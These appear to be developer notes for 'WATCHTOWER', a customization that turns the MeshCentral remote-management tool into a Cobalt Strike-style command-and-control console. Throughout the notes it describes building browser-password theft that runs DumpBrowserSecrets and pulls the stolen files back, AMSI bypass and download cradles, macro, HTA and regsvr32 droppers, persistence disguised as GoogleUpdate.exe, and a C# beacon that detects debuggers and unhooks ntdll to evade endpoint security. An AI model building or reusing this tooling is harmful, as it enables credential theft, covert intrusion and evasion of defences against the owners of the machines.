# MeshCentral Project Notes — WATCHTOWER v1.0

## Overview
MeshCentral v1.1.57 — open-source remote computer management web application (Node.js).
Customized as **WATCHTOWER v1.0**: a Cobalt Strike-themed C2 UI layer on top of MeshCentral.

---

## Changes Log

### Phase 1 — Core C2 Feel (2026-03-04)
**Files modified:** `public/scripts/custom.js`, `public/styles/custom.css`

#### Section 17: Beacon Session Table
- `hookBeaconTable()` — MutationObserver on `#xdevices` to restyle on update
- `hookBeaconDeviceUpdate()` — Hooks `updateDeviceViewDevice()` for per-row live updates
- `styleBeaconRow(row, node)` — Adds CSS classes: `wt-beacon-active/idle/dead/new` to `<tr>` rows
- `styleBeaconHeaders()` — Renames `<th>` labels to CS-style (User→OPERATOR, Address→IP ADDRESS, etc.)
- `injectBeaconBadge()` — Injects 8-char beacon ID chip (`.wt-beacon-id-badge`) before device name
- `injectBeaconHeader()` — Sticky bar above table: active/dead counts + sync timestamp
- `updateBeaconHeaderCounts()` — Polls node list every 4s to update header counts
- VM detection added to `styleBeaconRow()`:
  - `node.icon === 8` (XEN agent) OR keyword scan of `node.osdesc/osinfo` (virtual/vmware/hyper-v/virtualbox/vbox/kvm/qemu/xen/parallels/bhyve)
  - VM rows get class `wt-vm-node`, icon swapped to `i8`, purple glow + purple text applied

#### Section 18: Listener Manager Panel
- `injectListenerButton()` — Adds LISTENERS toolbar button to `#devListToolbarSpan`
- `createListenerPanel()` — Builds slide-down table panel below toolbar
- `toggleListenerPanel()` — Show/hide with button highlight
- `refreshListenerTable()` — Reads `meshes` object, shows Name/Payload/Host/Protocol/Beacons/Status

#### Section 19: Command Palette (Quick-Fire)
- `setupCommandPalette()` — Loads history from localStorage, starts terminal watcher
- `watchForTerminal()` — MutationObserver that detects terminal opening
- `injectCommandPalette()` — Sidebar with quick-fire commands (color-coded by category: recon/net/proc/enum/files/priv/loot)
- `sendBeaconCmd()` — Cascade: (1) `terminal.sendText(cmd+'\r')`, (2) SSH socket, (3) `xterm.input()`, (4) KeyboardEvent per-char
- `renderCmdHistory()` — Shows last 25 commands, click-to-replay
- Command history persisted to localStorage as `wt_cmd_history_v1`
- **DBS quick-fire commands** (loot category, gold `#ffd700`):
  - `dbs-drop` — Download DBS exe + DLL to `$env:TEMP`
  - `dbs-all` — Run DBS against all browsers (Chrome/Edge/Brave/Firefox/Opera) with `/spoof`
  - `dbs-chrome` — Run DBS against Chrome + Edge + Brave only
  - `dbs-enc` — Run DBS with encrypted output (`/enc:0xDEADBEEF`)
  - **All DBS commands wrapped in `powershell -ep bypass -c "..."` to work from CMD and PS sessions**

---

### Phase 2 — Situational Awareness (2026-03-04)
**Files modified:** `public/scripts/custom.js` (1524 → 2021 lines), `public/styles/custom.css` (2348 → 2730 lines)

#### Section 20: Network Topology Map (JS) / Section 49 (CSS)
- `injectTopologyButton()` — Adds ◢ TOPO button to `#devListToolbarSpan`
- `toggleTopologyPanel()` / `buildTopoPanel()` — Canvas panel appended inside `#p1`
- `refreshTopo()` — Rebuilds node list from `nodes[]` + `meshes{}` globals
- `layoutTopo()` — Radial layout: mesh hubs in outer ring, beacons in sub-rings around their hub
- `drawTopo()` — Canvas renderer: grid, edge lines, diamond mesh hubs, circle beacons with status colors
- `topoHitTest()` / `topoMouseMove()` / `topoMouseDown()` / `topoClick()` — Pan (drag) + zoom (scroll) + hover tooltip + click select
- Auto-refresh every 5s when panel is open (setInterval in init)

#### Section 21: Target Intelligence Cards (JS) / Section 50 (CSS)
- `setupIntelCards()` — Hooks `window.gotoDevice()` to capture current node ID
- `injectIntelCard()` — Fixed-position card (top-right) showing: Beacon ID, status dot, OS, IP, last seen, mesh group, user
- Tags system — 6 tactical tags (HIGH VALUE, PIVOT, DOM ADMIN, EXFIL, SENSITIVE, MONITORED) toggle via click, persisted to `wt_tags_v1` in localStorage
- Operator Notes — `<textarea>` per device, saved to `wt_notes_v1` in localStorage on blur
- `removeIntelCard()` — Fades out and removes; called when navigating away from device panels
- `hookGoFunction` extended — removes intel card when `go(x)` called with x < 10 or x >= 20

#### Section 22: Operations Timeline (JS) / Section 51 (CSS)
- `setupOpsTimeline()` / `injectOpsButton()` — Adds ☰ OPS button to toolbar
- `wtLogEvent(type, msg, nodeId)` — Core logger; called from `wtProcessMessage()` alongside `addFeedItem()`
- `toggleOpsPanel()` / `buildOpsPanel()` — Fixed bottom-right panel (490×290px)
- `renderOpsLog()` — Renders up to 150 log entries with timestamp, type icon, beacon ID badge, message
- Filter dropdown — ALL / CONNECT / DISCONNECT / AUTH / CMD / ALERT / INFO
- CLR button — clears in-memory log and localStorage
- Persists last 60 events to `wt_ops_v1` in localStorage
- Button flashes green on new event

---

### Phase 3 — Payload Studio + DBS Integration (2026-03-04)
**Files modified:** `public/scripts/custom.js` (2048 → 2297 lines), `public/styles/custom.css` (2802 → 3018 lines)

#### Section 24: Payload Studio (JS) / Section 52 (CSS)
- `injectPayloadButton()` — Adds ⬇ PAYLOAD toolbar button to `#devListToolbarSpan`
- `togglePayloadPanel()` / `createPayloadPanel()` — Slide-down panel inserted after toolbar span
- `buildPayloadShell()` — Renders header (LISTENER selector + close), 5 tab buttons, 5 tab content divs
- `refreshPayloadPanel()` — Rebuilds all tab content when mesh selection changes; wires copy buttons
- `wtPayMeshIdParam(meshKey)` — Extracts meshid URL param from full mesh key (`key.split('/').pop()`)
- `wtPayRow(label, id, value, dlUrl)` — Helper: row with label, readonly input, COPY button, optional DL link
- `wtPaySection(title, rows)` — Helper: titled section block
- `wtBuildWinTab(base, mid)` — Windows tab: x64/x86/ARM64 signed agents + certutil/PS bypass one-liners
- `wtBuildLinuxTab(base, serverUrl, mid)` — Linux tab: binaries (x86-64/ARM64) + wget/curl auto-installer
- `wtBuildMacTab(base, mid)` — macOS tab: x64/ARM64/Universal agents + PKG installer
- `wtBuildOneLinerTab(base, serverUrl, mid)` — One-Liners: PS WebClient/hidden/iwr, certutil, bitsadmin, Linux wget/curl
- `wtBuildDbsTab()` — DBS tab: staging + execution commands (all wrapped in `powershell -ep bypass -c "..."`)
- Agent URL format: `window.location.origin + '/meshagents?id=N&meshid=' + meshid.split('/').pop()`

#### DumpBrowserSecrets Integration
- `WT_DBS_EXE` / `WT_DBS_DLL` — GitHub release URLs for DumpBrowserSecrets.exe v1.2.0 + DllExtractChromiumSecrets.dll
- DBS tab shows: Drop EXE, Drop DLL, Drop Both, Drop+Run All, plus 6 execution variants (all/Chrome+Edge+Brave/Firefox/Opera/encrypted/decrypt)
- Output files written to `%TEMP%\`: `EdgeData.json`, `ChromeData.json`, `BraveData.json`, `FirefoxData.json`, etc.
- Quick-Fire palette extended with `loot` category
- **All DBS commands wrapped with `powershell -ep bypass -c "..."` so they work from CMD and PS terminals**

---

### Phase 4 — Loot Vault (2026-03-05)
**Files modified:** `public/scripts/custom.js` (~2297 → ~2520 lines), `public/styles/custom.css` (~3022 → ~3240 lines)

#### Section 25: Loot Vault (JS) / Section 53 (CSS)
- `setupLootVault()` — called from `init()`; loads store, injects toolbar button, wires context menu listener
- `loadLootStore()` / `saveLootStore()` — read/write `wt_loot_v1` localStorage key (up to 500 entries)
- `addLootEntry(content, tag, nodeId)` — creates entry `{ id, ts, tag, content, nodeId, beaconId, beaconName, ip }`, prepends to store, flashes VAULT button, logs to OPS timeline via `wtLogEvent('LOOT', ...)`
- `deleteLootEntry(id)` — removes single entry, re-renders table
- `updateLootBadge()` — updates red count badge on toolbar button
- `injectLootButton()` — adds `▲ VAULT` button to `#devListToolbarSpan`
- `toggleLootPanel()` / `buildLootPanel()` — full-width slide-down panel (same insert point as listener/payload panels)
- `renderLootTable()` — renders filtered + searched entries as table rows with timestamp, beacon ID badge, IP, tag badge (color-coded), content code block (expand/collapse for >140 chars), copy + delete per-row
- `exportLoot()` — copies all (or filtered) entries to clipboard as formatted text report; fallback to new window
- `setupLootContextMenu()` — captures `contextmenu` in capture phase on the terminal `#termarea3xdiv`; calls `xterm.getSelection()` then falls back to `window.getSelection()`
- `showLootCtxMenu(x, y, text)` — smart-positioned context menu (avoids viewport edges); shows text preview + 6 tag options; dismisses on outside `mousedown`
- **Tags**: CREDS (red `#ff3333`) / HASHES (orange `#ff8c00`) / KEYS (gold `#ffd700`) / RECON (cyan `#00d4ff`) / FILES (green `#00ff41`) / OTHER (gray `#7a8a9a`)
- **Panel features**: search bar (filters by content/beacon/IP), tag dropdown filter, EXPORT button (clipboard), CLR button (confirm dialog), ✕ close
- `wtCurrentIntelNodeId` reused — already set by `gotoDevice()` hook in Section 21, so loot entries automatically get the correct beacon association when saving from terminal

---

### Phase 5 — Modern Device Icons + VM Detection (2026-03-05)
**Files modified:** `public/styles/custom.css` (~3240 → ~3501 lines), `public/scripts/custom.js` (VM detection in Section 17)
**New files:** `public/images/wt-icons/i1.svg` → `i8.svg`

#### Section 54: Modern Device Icons (CSS)
- Overrides MeshCentral's CSS sprite sheet classes `.i1`–`.i8` and `.j1`–`.j8` (gray variants)
- All icons use `background-image: url(../images/wt-icons/iN.svg) !important`
- Cyan glow applied to all active icons via `filter: drop-shadow(0 0 5px rgba(0, 212, 255, 0.45))`
- Icon map:
  - `i1.svg` — Desktop/PC: monitor + terminal prompt + status LED (cyan)
  - `i2.svg` — Laptop: screen + keyboard + touchpad (cyan)
  - `i3.svg` — Server: 3-unit rack with status LEDs (cyan)
  - `i4.svg` — Tablet: portrait + home button + volume keys (cyan)
  - `i5.svg` — Mobile phone: notch + side buttons + home bar (cyan)
  - `i6.svg` — NAS/Database: cylinder with shelf lines + status dots (cyan)
  - `i7.svg` — Custom/Unknown agent: hexagon + inner ring + spokes (cyan)
  - `i8.svg` — VM: monitor with guest VM window + purple titlebar + "VM" badge (purple `#a855f7`)
- VM nodes get purple glow: `.i8:not(.gray), .wt-vm-node .i1:not(.gray)` etc.
- VM node name text: `.wt-vm-node td.style10 { color: #c084fc !important }`
- VM beacon ID badge: `border-color: #a855f7; color: #c084fc`

#### VM Detection (JS — Section 17 `styleBeaconRow()`)
```javascript
var isVM = (node.icon === 8);
if (!isVM) {
    var od = (node.osdesc || node.osinfo || '').toLowerCase();
    var vmKeywords = ['virtual', 'vmware', 'hyper-v', 'hyperv', 'virtualbox', 'vbox', 'kvm', 'qemu', 'xen', 'parallels', 'bhyve'];
    for (var vi = 0; vi < vmKeywords.length; vi++) {
        if (od.indexOf(vmKeywords[vi]) >= 0) { isVM = true; break; }
    }
}
if (isVM) {
    row.classList.add('wt-vm-node');
    var iconDiv = row.querySelector('[class^="i"]');
    if (iconDiv && node.icon !== 8) {
        iconDiv.className = iconDiv.className.replace(/\bi\d\b/, 'i8');
    }
}
```

---

## Bug Fixes Log

### Bug Fix 1: Terminal blank after Connect (2026-03-04)
- **Root cause**: `injectCommandPalette()` targeted `termDiv.parentNode` = `td#termarea3x` (table cell) as the flex container. Applying `display: flex !important` to a `<td>` breaks table rendering, making xterm invisible
- **Fix**: Changed `var container = termDiv.parentNode` → `var container = termDiv` (targets `div#termarea3xdiv` directly)

### Bug Fix 2: Desktop toolbar controls invisible (2026-03-04)
- **Root cause**: `style.css` sets `.areaFoot { height: 22px }`. Global `input[type="button"] { padding: 6px 16px !important }` makes buttons ~28px tall — overflow clipped
- **Fix**: `.areaFoot { height: auto !important; min-height: 26px !important; overflow: visible !important }` + grid row fix

### Bug Fix 3: Quick-fire buttons invisible — CSS specificity war (2026-03-05)
- **Root cause**: `.wt-cmd-btn` (spec `0,1,0`) lost to global `button:not(.xterm-helper-textarea)` (spec `0,1,1`)
- **Fix**: Changed to `#wtCmdPalette .wt-cmd-btn` (spec `1,1,0`) — beats global rule

### Bug Fix 4: sendBeaconCmd not sending (2026-03-05)
- **Root cause**: Dispatching `input` events on xterm textarea — xterm.js ignores those
- **Fix**: Cascade: `terminal.sendText()` → SSH socket → `xterm.input()` → KeyboardEvent per-char

### Bug Fix 5: Desktop fullscreen grid layout (2026-03-04)
- **Root cause**: `body.fulldesk #deskarea0` grid row 1 fixed at `24px`, footer pushed off screen
- **Fix**: `body.fulldesk #deskarea0 { grid-template-rows: max-content max-content 1fr max-content !important; }`

### Bug Fix 6: DBS commands fail in CMD terminal (2026-03-05)
- **Root cause**: DBS commands used `cd $env:TEMP; iwr "..."` — PowerShell syntax. MeshCentral agent terminals default to `cmd.exe`. CMD treats `$env:TEMP` as a literal path → "The system cannot find the path specified."
- **Fix**: Wrapped all DBS commands (quick-fire + Payload Studio) with `powershell -ep bypass -c "..."` so they work from both CMD and PowerShell sessions

### IP / Certificate Change (2026-03-04)
- Server moved from `192.168.150.81` → `192.168.101.5`
- Updated `meshcentral-data/config.json` → `"cert": "192.168.101.5"`
- Deleted old TLS certs in `meshcentral-data/` and restarted; new certs auto-generated

---

## Current File Sizes
- `public/scripts/custom.js`: ~3012 lines
- `public/styles/custom.css`: ~3642 lines
- `public/images/wt-icons/`: 8 SVG files (i1.svg → i8.svg)

---

## localStorage Keys Used
| Key | Contents | Max |
|-----|----------|-----|
| `wt_cmd_history_v1` | Last 25 quick-fire commands sent | 25 entries |
| `wt_tags_v1` | Target intel tags per node ID | Unbounded |
| `wt_notes_v1` | Operator notes per node ID | Unbounded |
| `wt_ops_v1` | Operations timeline events | 60 events |
| `wt_loot_v1` | Loot vault entries | 500 entries |
| `wt_creds_v1` | Harvested credentials (browser/url/user/pass) | 1000 entries |

---

## Architecture Notes
- Desktop (`#p11`) layout: `#deskarea0` → `#deskarea1` (areaHead top toolbar) → `#deskarea3x` (canvas area) → `#deskarea4` (areaFoot bottom toolbar)
- Terminal (`#p12`) layout: `td#termarea3x` (table cell) → `#termarea3xdiv` (div) → xterm instance
- Command palette must be appended to `#termarea3xdiv` (the div), NOT its parent `td#termarea3x`
- All buttons globally styled with `padding: 6px 16px` — toolbar areas must override to `padding: 1px 8px`
- MeshCentral globals: `nodes[]` (beacon list), `meshes{}` (listener/group list), `terminal` (active WS), `xterm` (xterm.js)
- Global button rule `button:not(.xterm-helper-textarea)` has specificity `0,1,1` — always scope custom button styles with `#scopeId .class`
- `body.fulldesk` class added when desktop panel opens (line 9921 of default.handlebars)
- Agent meshid URL param = `meshKey.split('/').pop()` (last segment of full mesh key)
- All WATCHTOWER JS lives inside a single IIFE in `custom.js` — no module system

---

## Preferences
- Terminal commands default to CMD-safe syntax; wrap PS-only commands in `powershell -ep bypass -c "..."`
- All custom CSS must use `!important` and scoped selectors to beat MeshCentral's existing rules
- Theme: dark `#0a0e14` background, `#00d4ff` cyan, `#00ff41` green, `#ff3333` red, `#ff8c00` orange

---

---

### Phase 6 — Credential Harvester (2026-03-05)
**Files modified:** `public/scripts/custom.js` (~2659 → ~3012 lines), `public/styles/custom.css` (~3501 → ~3642 lines)

#### Section 26: Credential Harvester (JS) / Section 55 (CSS)
- `setupCredParser()` — called from `init()`; loads store, injects toolbar button, exposes `window._wt*` row-action helpers
- `injectCredsButton()` — adds `■ CREDS` button with red count badge to `#devListToolbarSpan`
- `toggleCredsPanel()` / `buildCredsPanel()` — slide-down panel with HARVEST / EXPORT / CLR / ✕ buttons
- `wtHarvest()` — 12s orchestrated flow:
  - t=0s: `sendBeaconCmd('powershell -ep bypass -c "cd $env:TEMP; .\dbs.exe /b:all /e:all /spoof"')`
  - t=2s: `sendBeaconCmd('powershell -ep bypass -c "Write-Host \'WTTEMP:\'+$env:TEMP"')`
  - t=5s: `wtExtractTempPath()` — scans last 100 xterm buffer lines for `WTTEMP:` marker
  - t=12s: `wtFetchCredFiles()` — fetches ChromeData/EdgeData/BraveData/FirefoxData/OperaData.json via `/devicefile.ashx`
- `wtFetchOneCredFile(mid, nid, tempPath, filename, browser, node, cb)` — tries `tempPath\file` then `C:\Windows\Temp\file` as fallback; uses `fetch('devicefile.ashx?c=authCookie&m=mid&n=nid&f=filepath')`
- `wtParseCredJSON(text, browser, node)` — handles Chromium (`url/username/password`) and Firefox (`origin_url/username_value/password_value`) field name variants; deduplicates; prepends to `wtCredsStore`
- `wtRenderCredsTable()` — searchable+filterable table: BROWSER / URL / USERNAME / PASSWORD / BEACON / ACTIONS
- Per-row: SHOW/HIDE password toggle, U:P copy, PASS copy, VAULT (sends to Loot Vault as CREDS tag), ✕ delete
- `wtExportCreds()` — clipboard export: `[Browser] beaconId @ ip \n URL / USER / PASS` formatted
- `wtEsc()` / `wtTrunc()` — shared HTML escape + truncate helpers
- **Assumes DBS already staged** — shows warning if no files found, directing to Payload Studio DBS tab
- `updateCredsBadge()` — red count badge on CREDS button
- Fires `wtLogEvent('LOOT', ...)` and flashes CREDS button green on successful harvest
- Persists to `wt_creds_v1` localStorage (max 1000 entries)

#### File Fetch Mechanism
- Endpoint: `devicefile.ashx?c=<authCookie>&m=<meshid_last_segment>&n=<nodeid_last_segment>&f=<filepath>`
- `authCookie` — MeshCentral global available in page context
- `mid` / `nid` — extracted via `.split('/').pop()` from node's `meshid` / `_id` fields

### Phase 7 — Trip-Wire Monitor (2026-03-05)
**Files modified:** `public/scripts/custom.js` (~3018 → ~3346 lines), `public/styles/custom.css` (~3642 → ~3934 lines)

#### Section 29: Trip-Wire / Keyword Alert Monitor (JS) / Section 56 (CSS)
- `setupTripWire()` — loads rules + alerts, injects toolbar button, starts xterm buffer watcher
- `injectTripWireButton()` — `⚡ WIRE` toolbar button with red count badge
- `buildTripWirePanel()` — two-column panel: RULES (left 56%) + ALERTS (right 44%)
- `renderTripWireRules()` — table with per-rule toggle switch, tag badge, vault indicator, delete (custom only)
- `addTripWireRule()` — parses `keyword` or `/regex/flags` format, validates, appends
- `renderTripWireAlerts()` — scrollable alert log: ts / tag / beacon ID / matched line; copy + vault per row
- `startTripWireWatcher()` — `setInterval(800ms)` on `xterm.buffer.active`, scans new lines via `wtTripWireLastLine`
- `wtScanLine(line)` — tests against all enabled rules; first match wins
- `wtTripWireFire(rule, line)` — creates entry, auto-loots if `autoLoot:true`, `wtLogEvent('ALERT',...)`, CSS flash on WIRE button
- **10 built-in rules (non-deletable):** password/passwd/credential→CREDS, NTLM hash regex→HASHES, NTHash→HASHES, SeDebugPrivilege→PRIV, NT AUTHORITY→PRIV, PRIVATE KEY→KEYS, ssh keys→KEYS, flag{→LOOT
- Persists: `wt_tripwire_v1` (rules), `wt_alerts_v1` (alerts, max 100)

### Phase 8 — Beacon Tasking Queue (2026-03-05)
**Files modified:** `public/scripts/custom.js` (~3346 → ~3747 lines), `public/styles/custom.css` (~3934 → ~4197 lines)

#### Section 27: Beacon Tasking Queue (JS) / Section 57 (CSS)
- `setupTaskQueue()` — called from `init()`; loads store, injects button, hooks terminal watcher
- `loadTaskStore()` / `saveTaskStore()` — `wt_taskq_v1` localStorage (per-nodeId task arrays)
- `isAutoFireOn(nodeId)` / `setAutoFire(nodeId, val)` — per-beacon auto-fire toggle, persisted to `wt_taskq_autofire`
- `injectQueueButton()` — `☰ QUEUE` toolbar button with cyan count badge (total tasks across all beacons)
- `toggleQueuePanel()` / `buildQueuePanel()` — slide-down panel (two-column: left=task list, right=presets)
- `renderQueueTaskList(nodeId)` — task list with per-row: ↑↓ reorder, ON/OFF toggle, ✕ delete, delay ms, fired-flash
- `renderQueuePresets()` — 20 quick-add preset buttons (recon/net/proc/enum/priv/loot) color-coded by `WT_CAT_COLORS`
- `addQueueTask(nodeId, cmd, label, delay)` — appends task, saves, re-renders, flashes badge
- `fireQueueForNode(nodeId)` — sequences through enabled tasks with cumulative delays, calls `sendBeaconCmd()`, flashes rows green
- `hookTerminalForQueue()` — MutationObserver on `#p12`/`#p13` visibility; when terminal opens + auto-fire on → calls `fireQueueForNode()` after 600ms
- **20 built-in presets**: whoami/all, systeminfo, ipconfig, netstat, arp, route, net shares, tasklist, ps list, net users, local admins, schtasks, services, whoami/priv, AV check, UAC level, env vars, dir %TEMP%, clipboard, wifi creds
- **Per-beacon auto-fire**: checked on terminal open; defaults to ON; respects per-beacon override in `wt_taskq_autofire`
- **FIRE NOW** button: manually trigger all enabled tasks for selected beacon immediately

### WTAgent — Custom C# Beacon (2026-03-05)
**New files:** `WTAgent/src/WTAgent.cs`, `WTAgent/wt_c2_server.js`, `WTAgent/compile.bat`, `WTAgent/SETUP.md`

#### WTAgent.cs — C# beacon (single-file, .NET 4.5+)
- **Anti-debug** (checked on start + periodically):
  - `IsDebuggerPresent()` — kernel32 flag
  - `CheckRemoteDebuggerPresent()` — remote debugger attach
  - `NtQueryInformationProcess(ProcessDebugPort)` — debug port check
  - `NtQueryInformationProcess(ProcessDebugFlags)` — NoDebugInherit flag check
  - Timing check: NOP loop duration; if >500ms → single-stepping detected
  - On detection: `Thread.Sleep(int.MaxValue)` (not exit — avoids "died on attach" tell)
- **Unhooking** (on start, best-effort):
  - Reads clean `ntdll.dll` from `C:\Windows\System32\ntdll.dll` via Win32 `CreateFile/ReadFile`
  - Parses PE `.text` section (raw offset + size) from disk copy
  - Gets in-memory `.text` VA from loaded module header via `GetModuleHandle`
  - `VirtualProtect(RWX)` → `Marshal.Copy(cleanBytes)` → `VirtualProtect(restore)`
  - Removes AV/EDR user-mode hooks on Nt* syscall stubs
- **Encrypted comms**:
  - Per-agent session: 32-byte AES key + 32-byte HMAC key (generated fresh per run)
  - Key exchange: keys RSA-2048 OAEP/SHA256 wrapped with server public key, sent once at register
  - Payload wire format: `IV(16) || AES-256-CBC(plaintext) || HMAC-SHA256(IV+ciphertext)`
  - TLS transport over HTTPS (self-signed cert accepted for lab use)
- **Sleep jitter**: `SLEEP_BASE ± SLEEP_JITTER` random sleep between check-ins
- **Kill switch**: `HKCU\Software\WTAgent\kill` registry value → clean exit
- **Agent ID**: deterministic `SHA256(MachineName|UserName|WTAgent)[:8]` — stable across restarts
- **Task types**: `shell` | `screenshot` | `proclist` | `download` | `upload` | `sleep` | `kill` | `selfdel`

#### wt_c2_server.js — Node.js C2 listener (standalone)
- HTTPS C2 on port 8443 (agent-facing); HTTP operator API on port 8444 (localhost only)
- Endpoints: `/wta/register`, `/wta/checkin`, `/wta/result`, `/wta/download`, `/wta/upload`
- RSA private key (`agent_unwrap.key`) unwraps per-agent session keys on register
- Operator API: list agents, queue tasks, fetch results, manage loot (exfil), stage files for download
- Loot saved to `loot/`, staged files served from `stage/`, all activity logged to `wt_c2.log`

---

### Phase 9 — Payload URL Sync + One-Liners Expansion (2026-03-18)
**Files modified:** `public/scripts/custom.js`, `public/styles/custom.css`

#### Payload Studio URL Fix
- `refreshPayloadPanel()` now mirrors "Add Mesh Agent" dialog exactly:
  `sName = serverinfo.name`, `sPort = serverinfo.port`, `dUrl = domainUrl`
- Base URL: `https://{sName}{portStr}{dUrl.replace(/\/$/,'')}` — always in sync with MeshCentral's own agent links

#### ONE-LINERS Tab Additions
- **PERSIST (NO UAC):** PS schtasks ONLOGON to `%APPDATA%\GoogleUpdate.exe` + CMD variant
- **SERVICE INSTALL (ADMIN/UAC):** `-fullinstall` PS + CMD variants
- **REMOVER / CLEANUP:** PS + CMD full cleanup (service stop/delete, schtasks delete, file delete, dir remove) + Linux uninstall

#### `wtPayBlock()` helper
- Multi-line `<textarea>` row (used for VBA/HTA/SCT content in OBFUS tab)
- `readonly` textarea with resize:vertical, COPY button reads `.value`

---

### Phase 10 — Payload Obfuscation Studio (2026-03-18)
**Files modified:** `public/scripts/custom.js` (~3012 → ~3400 lines), `public/styles/custom.css`

#### Section 32: Payload Obfuscation Studio (JS) / Section 60 (CSS)
- New purple `◆ OBFUS` tab in Payload Studio
- `wtBuildObfusTab(base, mid, rawMid)` — 6 sections, all payloads auto-computed from selected listener
- **AMSI BYPASS + DOWNLOAD CRADLE**: string-split bypass + SSL skip + download+run (3 variants: normal/hidden/cradle-only)
- **BASE64 ENCODED (-enc)**: UTF-16LE base64 for PS `-EncodedCommand` (AMSI+cradle, cradle-only, CMD→PS wrapper)
- **XOR RUNNER**: random XOR key (20–200) per panel open, base64-packed stub, `[char]($_-bxor$k)` decode
- **VBA MACRO**: AutoOpen + Workbook_Open, `Shell` + `WScript.Shell`, downloads+runs agent (textarea)
- **HTA DROPPER**: `mshta` inline (CMD-safe string quoting via `String.fromCharCode(34)`) + full `.hta` file template (textarea)
- **LOLBINs**: WMIC+PS-enc, regsvr32 squiblydoo cmd, `.sct` scriptlet template (textarea)

---

### Phase 11 — Cross-Platform Install Scripts (2026-03-18)
**New/modified files:** `meshcentral/start-watchtower.sh`, `meshcentral/install.ps1`, `meshcentral/start.bat`

#### `start-watchtower.sh` (upgraded — Linux/macOS/MINGW64/WSL)
Auto-installs missing deps + starts server. New capabilities vs old version:
- **Node.js install**: apt/yum/dnf/pacman/apk/brew/zypper detection; version check (>=14)
- **npm install**: skipped if `node_modules/` already populated
- **Optional dep checks**: openssl (for WTAgent RSA keys), csc.exe/mono/dotnet (for WTAgent compile)
- **Port check**: warns if 443 in use by non-MeshCentral process
- **Root check**: warns if not root on Linux/macOS (port 443 needs root or authbind)
- **LAN vs VPS**: public IP assigned to local NIC → VPS mode (cert=public IP); else LAN mode (cert=local IP)
- **`--no-start` flag**: setup only, don't launch server
- **JSON merge**: uses Node.js to safely update `cert` in config.json without overwriting other settings
- Creates `public/wt/` staging dir for WTAgent binary

#### `install.ps1` (new — Windows PowerShell native)
- Admin rights check, port 443 check
- Node.js: `Get-Command node` → winget → choco → MSI download fallback
- npm install, .NET csc.exe check, openssl check
- `Get-NetRoute` + `Get-NetIPAddress` for IP detection; public IP via ipify/ifconfig.me
- Safe JSON config merge via embedded Node.js
- Writes `start.ps1` and `start.bat` after setup
- `-NoStart` param: setup only

#### `start.bat` (new — Windows CMD double-click)
- Checks for Node.js; if missing, calls `install.ps1 -NoStart` then exits with instructions
- Otherwise: `cd MeshCentral-master && node meshcentral.js`

---

### Phase 12 — WTAGENT Payload Tab (2026-03-18)
**Files modified:** `public/scripts/custom.js`, `public/styles/custom.css`
**New directory:** `public/wt/` (staging dir for compiled WTAgent.exe)

#### Section 33: WTAGENT Tab (JS) / Section 61 (CSS)
- Gold `★ WTAGENT` tab in Payload Studio
- `wtBuildWTAgentTab(base)` — 6-section workflow tab:
  1. **GENERATE RSA KEYS** — openssl keygen commands (run once on C2 server)
  2. **COMPILE** — `compile.bat` + `csc.exe` direct command (csc confirmed at `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`)
  3. **STAGE BINARY** — staging URL auto-computed as `base + '/wt/WTAgent.exe'`; copy commands for CMD + bash
  4. **DROP + RUN** — PS download+run (SSL bypass), PS hidden, certutil+run
  5. **PERSIST (NO UAC)** — schtasks ONLOGON to `%APPDATA%\WTAgent.exe` (PS + CMD)
  6. **KILL SWITCH** — REG ADD kill key (CMD + PS) + PS self-delete via operator API
- `.claude/launch.json` registered: `MeshCentral-master/.claude/launch.json` (port 443, autoPort:false)

---

### Phase 13 — Multi-Beacon Broadcast (2026-03-18)
**Files modified:** `public/scripts/custom.js` (~4580 → ~4842 lines), `public/styles/custom.css` (~4387 → ~4527 lines)

#### Section 31: Multi-Beacon Broadcast (JS) / Section 62 (CSS)
- `setupBroadcast()` — called from `init()`; hooks p1updateInfo + meshserver.onmessage
- **Checkbox system**: hooks MeshCentral's native `p1updateInfo()` which fires on every `DeviceCheckbox` toggle; reads `checkedNodeids` global and `getCheckedDevices()`
- `injectBroadcastBar()` — orange bar inserted below `#devListToolbarSpan`, initially hidden
- `wtUpdateBroadcastBar()` — shows/hides bar based on `checkedNodeids` count; updates badge
- Bar elements: beacon count badge (orange), CLEAR button (`uncheckAllDevices()`), CMD/PS/SHELL type selector, command input, ⚡ BROADCAST button
- `wtFireBroadcast(cmd)` — sends `meshserver.send({action:'runcommands', nodeids:[...], type, cmds:cmd, runAsUser:0, responseid:'wt_bc_'+Date.now()})`
- Per-node result rows: beacon ID badge + name + status (`SENDING… / ✓ SENT / ✗ ERR`)
- `wtHandleBroadcastResponse(msg)` — intercepts meshserver messages where `responseid` starts with `wt_bc_`, updates per-node status
- **Keyboard fix**: `stopPropagation` on keydown/keyup/keypress on `#wtBcInput` so MeshCentral's global keyboard handler doesn't swallow keystrokes
- Every broadcast: logged to OPS timeline + saved to quick-fire history

---

## Current File Sizes (2026-03-18)
- `public/scripts/custom.js`: ~4842 lines
- `public/styles/custom.css`: ~4527 lines
- `public/images/wt-icons/`: 8 SVG files (i1.svg → i8.svg)
- `public/wt/`: WTAgent staging dir (serve compiled exe here)
- `WTAgent/src/WTAgent.cs`: ~530 lines
- `WTAgent/wt_c2_server.js`: ~340 lines
- `meshcentral/start-watchtower.sh`: smart start+install script
- `meshcentral/install.ps1`: Windows native installer
- `meshcentral/start.bat`: Windows quick-start

---

## localStorage Keys Used
| Key | Contents | Max |
|-----|----------|-----|
| `wt_cmd_history_v1` | Last 25 quick-fire / broadcast commands | 25 |
| `wt_tags_v1` | Target intel tags per node ID | Unbounded |
| `wt_notes_v1` | Operator notes per node ID | Unbounded |
| `wt_ops_v1` | Operations timeline events | 60 |
| `wt_loot_v1` | Loot vault entries | 500 |
| `wt_creds_v1` | Harvested credentials | 1000 |
| `wt_tripwire_v1` | Trip-wire rules | Unbounded |
| `wt_alerts_v1` | Trip-wire alert log | 100 |
| `wt_taskq_v1` | Per-beacon task queues | Unbounded |
| `wt_taskq_autofire` | Per-beacon auto-fire toggle | Unbounded |

---

## Bug Fixes Log (additions)

### Bug Fix 7: Broadcast input doesn't accept typing (2026-03-18)
- **Root cause**: MeshCentral has a global `keydown` event listener on `document` that intercepts keystrokes for UI shortcuts, preventing them from reaching input fields inside custom panels
- **Fix**: Added `stopPropagation()` on `keydown`, `keyup`, `keypress` events on `#wtBcInput` — stops events bubbling to MeshCentral's global handler

### Bug Fix 8: Payload Studio showing wrong IP (2026-03-18)
- **Root cause**: Used `serverinfo.magenturl` (mc:// protocol) to extract hostname — unreliable when server IP changes
